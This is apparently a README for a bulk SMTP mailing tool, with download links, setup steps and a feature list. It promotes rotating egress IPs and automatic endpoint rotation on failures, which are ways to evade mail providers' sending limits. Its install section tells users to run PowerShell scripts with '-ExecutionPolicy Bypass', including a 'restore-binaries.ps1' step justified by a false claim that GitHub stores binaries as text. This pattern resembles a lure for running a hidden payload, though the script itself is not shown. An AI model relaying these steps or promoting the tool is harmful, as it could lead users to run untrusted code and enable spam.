# MAIL MOWAFAK

**Mowafak Store** — مُرسَل جماعي عبر SMTP مع تدوير عنوان الخروج.
نسخة بيضاء العلامة: محرّك واحد يخدم عدة عملاء، كل عميل له هويته وحالته المستقلة.

> اسم البرنامج **MAIL MOWAFAK** مقفل: هو جزء من الحزمة الموقّعة (RSA-2048)، فمن
> يحاول تغييره يجد أن البرنامج يرفض العمل. وهو **لا يظهر أبداً في الرسائل**:
> كل رسالة تحمل هوية العميل الذي شُيّنت له.

---

## Download / التحميل

### Full bundle (Windows, Node bundled, no installation)

    https://z4ln662j87l6x.space.mcode.io/MailRotatorStudio-Portable.zip

SHA-256:

    e0cc3b00257baaded895549f4a0372edb274944d0712b98c58720c6037eb99bb

Automated download (verifies the checksum, never runs the program):

    powershell -NoProfile -ExecutionPolicy Bypass -File .\get-studio.ps1

    # macOS / Linux
    chmod +x get-studio.sh && ./get-studio.sh

### Source

    git clone https://github.com/pvolonino81-hash/mail-mowafak.git

The engine is a signed build. GitHub stores binary assets as text, so after
cloning run this once:

    powershell -NoProfile -ExecutionPolicy Bypass -File .\restore-binaries.ps1

---

## Run it / التشغيل

1. Unzip the bundle anywhere.
2. Double-click **Start-Studio.cmd**.
3. The console opens at http://127.0.0.1:8931/dashboard
4. Point it at the project folder, set your SMTP account in
   project\config\config.json (message.fromEmail must equal smtp.username),
   then send.

Requirements: Windows 10/11 and PowerShell 5.1. Node.js is **not** required, it
ships inside the bundle. The full Arabic guide is in README-AR.md and in
engine/guide/index.html.

---

## What it does

- Bulk sending over SMTP with rotating egress IPs (150 messages per endpoint).
- White-label: one engine, many client profiles, each with its own brand,
  sender, audience, checkpoint and suppression list.
- Creative and link rotation with per-variant reporting.
- **AI Doctor**: watches the run log, classifies every SMTP failure and repairs
  it (lower the pacing, shrink the batch, rotate the endpoint, suppress a dead
  address, fix the sender, stop the run).
- Compliance gates: requireUnsubscribe, List-Unsubscribe, a physical address,
  an opt-in consent basis and a domain allow-list.

## License

Published by Mowafak Store. The product name and the logo are covered by the
signed manifest and may not be altered.
